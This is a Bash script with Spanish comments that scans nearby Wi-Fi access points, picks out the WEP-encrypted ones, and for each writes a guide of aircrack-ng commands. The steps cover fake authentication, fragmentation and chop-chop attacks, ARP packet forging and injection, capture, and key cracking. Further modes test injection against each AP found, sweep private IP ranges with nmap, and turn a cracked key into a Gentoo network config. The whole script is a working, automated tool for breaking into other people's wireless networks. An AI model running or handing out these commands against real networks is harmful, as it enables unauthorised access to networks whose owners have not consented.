# !/bin/bash
# Host 192.168.84.1 appears to be up.
# Host 192.168.84.254 appears to be up.

if [ "$1" == "help" ]
then
	echo "pipa.sh [comando]"
	echo "Si lo llamas sin comando escaneara y generara la config para los distintos "
	echo "gentoo-config : Genera la configuracion para gentoo, tienes que ejecutarlo desde una carpeta que ya hayas conseguido la password del ap, "
	# TODO : TERMINAR
	exit
fi

if [ "$1" == "gentoo-config" ]
then
	source variables.sh
	PASSWORD=`cat password.txt | grep KEY | sed -e "s/.*\[ //g" -e "s/ \].*//g"`
	echo "essid_ath0=\"$ESSID\""
	echo "key_$ESSID=\"$PASSWORD\""
	echo "config_ath0=( \"dhcp\" )"
	exit
fi

if [ "$1" == "reset-iface" ]
then
	airmon-ng stop ath1
	airmon-ng stop ath0
	wlanconfig ath create wlandev wifi0 wlanmode sta
	iwconfig ath0 channel 1
	ifconfig ath0 up
	exit
fi

if [ "$1" == "test-injection" ]
then
	airmon-ng stop ath1
	airmon-ng stop ath0
	wlanconfig ath create wlandev wifi0 wlanmode sta
	iwconfig ath0 channel 1
	ifconfig ath0 up
	airmon-ng start wifi0 1
	airmon-ng stop ath0
	
	CHANNEL_LIST=`iwlist ath1 channel | grep "Channel.*:" | sed -e "s/.*Channel //g" -e "s/ .*//g" -e "s/^0//g"`
	
	for CHANNEL_AUX in $CHANNEL_LIST
	do
		# hay alguna veces (con aireplay lo he comprobado) que se queda pillado en un canal
		# y que no cambia con iwconfig channel a no ser que hagas down antes de la interfaz
		ifconfig ath1 down; iwconfig ath1 channel $CHANNEL_AUX; ifconfig ath1 up;
		
		echo "PROBANDO CANAL : $CHANNEL_AUX"
		echo "===================================================================="
		aireplay-ng -9 ath1
	done
	exit
fi

if [ "$1" == "search-ip" ]
then
	# TODO: Hacer el nmap desde un bucle para poder hacer un prgreesbar o algo semejante.
	echo "## Probando con el rango 192.168.0.0 - 192.168.255.255, ignora el up 192.168.0.254"
	echo "## en cuantro encuentres una ip viva (up) puedes cancelar este proceso con Ctrl+C"
	echo "##"
	ifconfig ath0 192.168.0.254 netmask 255.255.0.0
	nmap -v -sP 192.168.0.0/16 |  grep " appears to be up"
	echo "## Probando con el rango 10.0.0.0 - 10.255.255.255, ignora el up 10.0.0.254"
	echo "## en cuantro encuentres una ip arriba (up) puedes cancelar este proceso con Ctrl+C"
	echo "##"
	ifconfig ath0 10.0.0.254 netmask 255.0.0.0
	nmap -v -sP 10.0.0.0/8 |  grep -v " appears to be up"
	exit
fi

MAC_ADDRESS=`ifconfig ath0 | grep HWaddr | sed -e "s/.*HWaddr //g" -e "s/ .*//g"`

CHANNEL_LIST=`iwlist ath0 channel | grep "Channel.*:" | sed -e "s/.*Channel //g" -e "s/ .*//g" -e "s/^0//g"`

echo -n "Escaneando y guardando config :"

CHANNEL_AUX=1
# for CHANNEL_AUX in $CHANNEL_LIST
# do
	# hay alguna veces (con aireplay lo he comprobado) que se queda pillado en un canal
	# y que no cambia con iwconfig channel a no ser que hagas down antes de la interfaz
	ifconfig ath0 down; iwconfig ath0 channel $CHANNEL_AUX; ifconfig ath0 up;
	echo ""
	echo -n "[channel $CHANNEL_AUX] "
	
	IWLIST_DATA=`iwlist ath0 scan | grep "Address\|ESSID\|Channel\|WPA\|Mode\|Encryption" | tr "\n" " " | sed -e "s/Cell/\nCell/g" | grep "Mode:Master" | grep "Encryption key:on" | sed -e "s/Mode:Master//g" -e "s/Encryption key:on//g" | sed -e "s/Frequency:2.....GHz//p" | sort | uniq | sed -e "s/ESSID/ ESSID/g" | sed -e "s/Cell...//g" | grep -v WPA | sed -e "s/(/ /g" -e "s/)/ /g" -e "s/Channel/Channel:/g" | sed -e "s/^ - //g" -e "s/ *ESSID/ ESSID/g" -e "s/\" *Channel: /\" Channel:/g" -e "s/Address: /Address:/g"`
	IWLIST_DATA=`echo $IWLIST_DATA | sed -e "s/Address/\nAddress/g"`
	IWLIST_DATA=`echo $IWLIST_DATA | sed -e "s/ /#/g" | sed -e "s/Address/\nAddress/g"`

	for ESSID_CFG in $IWLIST_DATA
	do
		ESSID_CFG=`echo $ESSID_CFG | sed -e "s/#/ /g"`
		
		BSSID=`echo $ESSID_CFG | sed -e "s/Address://g" -e "s/ ESSID.*//g"`
		ESSID=`echo $ESSID_CFG | sed -e "s/.*ESSID:\"//g" -e "s/\".*//g"`
		CHANNEL=`echo $ESSID_CFG | sed -e "s/.*Channel://g" -e "s/ //g"`

		IWLIST_DATA_AUX="$IWLIST_DATA_AUX$CHANNEL#$BSSID#[$ESSID]\n"

		echo -n "."

		DIRWIFI=`echo "$ESSID-$BSSID" | sed -e "s/:/-/g" -e "s/ /\\ /g"`
		mkdir -p "$DIRWIFI"
	
		echo "BSSID=$BSSID" > "$DIRWIFI/variables.sh"
		echo "ESSID=$ESSID" >> "$DIRWIFI/variables.sh"
		echo "CHANNEL=$CHANNEL" >> "$DIRWIFI/variables.sh"
	
		echo "# 1) Inicializar la interfaz en modo monitor con :" > "$DIRWIFI/ayuda.txt"
		echo "airmon-ng start wifi0 $CHANNEL" >> "$DIRWIFI/ayuda.txt"
		echo "# 2) Destruimos la interfaz ath0 con :" >> "$DIRWIFI/ayuda.txt"
		echo "airmon-ng stop ath0" >> "$DIRWIFI/ayuda.txt"
		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
	
		echo "# 3) Probamos ha hacer una falsa autenticacion con :" >> "$DIRWIFI/ayuda.txt"
		echo "aireplay-ng -1 0 -e \"$ESSID\" -a $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/ayuda.txt"
		echo "# 3.1) Si falla deberiamos mirar si el ap filtra por ap o si estamos lo suficientemente cerca. Si aun asi no conseguimos hacer la false autenticacion debemos desistir porque el resto de pasos fallara" >> "$DIRWIFI/ayuda.txt"
		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"

		echo "# 4) Aqui tenemos 2 caminos :" >> "$DIRWIFI/ayuda.txt"
		echo "# 4.1) Si hay clientes conectados podemos intentar el ataque por fragmentacion" >> "$DIRWIFI/ayuda.txt"
		echo "# 4.1.2) Empezamos a capturar los paquetes en una consola nueva lanzamos :" >> "$DIRWIFI/ayuda.txt"
		echo "airodump-ng -c $CHANNEL --bssid $BSSID -w capture ath1" >> "$DIRWIFI/ayuda.txt"
		echo "# 4.1.3) En otra nueva consola lanzamos el ataque por fragmentacion ejecutando :" >> "$DIRWIFI/ayuda.txt"
		echo "aireplay-ng -3 -b $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/ayuda.txt"
		echo "# 4.1.3.1) En cuanto empieze a inyectar paquetes pasamos al paso 5" >> "$DIRWIFI/ayuda.txt"
		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
	
		echo "# 4.2) Si NO hay clientes conectados podemos intentar el ataque chop-chop" >> "$DIRWIFI/ayuda.txt"
		echo "# 4.2.1) El ataque chop-chop requiere un paquete especial, lo capturamos lanzando :" >> "$DIRWIFI/ayuda.txt"
		echo "aireplay-ng -5 -b $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/ayuda.txt"
		echo "# 4.2.1.1) Si no recibimos paquetes o cuando los recibimos no los podemos inyectar deberemos buscar ayuda en aircrack-ng.org ;o) lo mas seguro sera que el ap este filtrando por mac o que tengamos que esperar a que haya un cliente generando paquetes de datos, ya lo se, pone que no es necesario que haya clientes conectados pero en algunos aps es probable que lo necesitemos" >> "$DIRWIFI/ayuda.txt"
		echo "# 4.2.2) Tenemos que generar un paquete arp especial que genera muchos IVS o algo asi, lo haremos lanzando :" >> "$DIRWIFI/ayuda.txt"
		echo "packetforge-ng -0 -a $BSSID -h $MAC_ADDRESS -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w arp-request" >> "$DIRWIFI/ayuda.txt"
		echo "# 4.2.3) En una nueva consola lanzamos la captura de paquetes con : " >> "$DIRWIFI/ayuda.txt"
		echo "airodump-ng -c $CHANNEL --bssid $BSSID -w capture ath1" >> "$DIRWIFI/ayuda.txt"
		echo "# 4.2.4) En una nueva consola lanzamos la inyeccion del paquete formado con : " >> "$DIRWIFI/ayuda.txt"
		echo "aireplay-ng -2 -r arp-request ath1" >> "$DIRWIFI/ayuda.txt"
		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
	
		echo "# 5) En una nueva consola ejecutamos el crackeo de los paquetes capturados" >> "$DIRWIFI/ayuda.txt"
		echo "aircrack-ng -s -b $BSSID capture*.cap" >> "$DIRWIFI/ayuda.txt"
		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
		echo "# NOTAS :" >> "$DIRWIFI/ayuda.txt"
		echo "# N1) Para los casos de aps que no generan paquetes seria conveniente ejecutar en una nueva consola :" >> "$DIRWIFI/ayuda.txt"
		echo "watch -n 60 \"aireplay-ng -1 0 -e \\\"$ESSID\\\" -a $BSSID -h $MAC_ADDRESS ath1\"" >> "$DIRWIFI/ayuda.txt"
		echo "# N2) Para resetear la interfaz ejecutar y ponerla en modo normal :" >> "$DIRWIFI/ayuda.txt"
		echo "airmon-ng ath1 stop; wlanconfig ath0 create wlandev wifi0 wlanmode sta;" >> "$DIRWIFI/ayuda.txt"
		echo "# N3) Cambiar el canal de ath1, Hay veces (yo lo he visto al usar airmon-ng -9 ath1) que se queda en otro canal distinto al que configuramos inicialmente ath1 en el modo monitor, para cambiarlo ejecutar : " >> "$DIRWIFI/ayuda.txt"
		echo "ifconfig ath1 down; iwconfig ath1 channel $CHANNEL; ifconfig ath1 up;" >> "$DIRWIFI/ayuda.txt"
		echo "# N4) Siempre es conveniente saber a que aps podemos atacar y cuales estan mas cerca, la mejor forma es ejecutar : " >> "$DIRWIFI/ayuda.txt"
		echo "aireplay-ng -9 -a $BSSID ath1" >> "$DIRWIFI/ayuda.txt"
		echo "# Si no nos diera un buen resultado podemos buscar otro ap cambiando primero el canal de la ath1 (ver punto N3), esto no es necesario, pero, facilita encontrar aps" >> "$DIRWIFI/ayuda.txt"
		echo "# N999) Para una version abreviada de este documento sin los comentarios ejecutar :" >> "$DIRWIFI/ayuda.txt"
		echo "grep -v \"#\" ayuda.txt" >> "$DIRWIFI/ayuda.txt"
	done
# done
echo ""


echo "Quieres testear uno a uno los distintos aps encontrados? (S/n) :"
read res

if [ "$res" == "n" ]
then
	exit 0
fi

echo -n " * Poniendo la interfaz en modo monitor "
airmon-ng stop ath1 > /dev/null
echo -n "."
airmon-ng stop ath0 > /dev/null
echo -n "."
wlanconfig ath create wlandev wifi0 wlanmode sta > /dev/null
echo -n "."
iwconfig ath0 channel 1 > /dev/null
echo -n "."
ifconfig ath0 up > /dev/null
echo -n "."
airmon-ng start wifi0 1 > /dev/null
echo -n "."
airmon-ng stop ath0 > /dev/null
echo "."

# El for in separa por espacio o retorno de carro, por ello quitamos los espacios en blanco
# sustituyendolos por #
IWLIST_DATA_AUX=`echo $IWLIST_DATA_AUX | tr " " "#" | sort | uniq`

for ESSID_CFG in `echo -e $IWLIST_DATA_AUX`
do
	BSSID=`echo $ESSID_CFG | sed -e "s/#/ /g" -e "s/ \[.*//g" -e "s/.* //g"`
 	ESSID=`echo $ESSID_CFG | sed -e "s/#/ /g" -e "s/.*\[//g" -e "s/\].*//g"`
 	CHANNEL=`echo $ESSID_CFG | sed -e "s/#/ /g" -e "s/ .*//g"`

	echo "==============================================================================="
	echo " * Probando :: $BSSID [$ESSID]"
	echo "==============================================================================="
	echo "   Pulsa Ctrl+C para salir"
	ifconfig ath1 down; iwconfig ath1 channel $CHANNEL; ifconfig ath1 up;
	echo; echo "Probando asociacion : "
	aireplay-ng -1 0 -e "$ESSID" -a $BSSID -h $MAC_ADDRESS ath1
	echo; echo "Probando inyeccion : "
	aireplay-ng -9 -a $BSSID ath1
done

echo -n " * Poniendo la interfaz en modo station "
airmon-ng stop ath1 > /dev/null
echo -n "."
airmon-ng stop ath0 > /dev/null
echo -n "."
wlanconfig ath create wlandev wifi0 wlanmode sta > /dev/null
echo -n "."
iwconfig ath0 channel 1 > /dev/null
echo -n "."
ifconfig ath0 up > /dev/null
echo "."
echo "Terminado!!!"
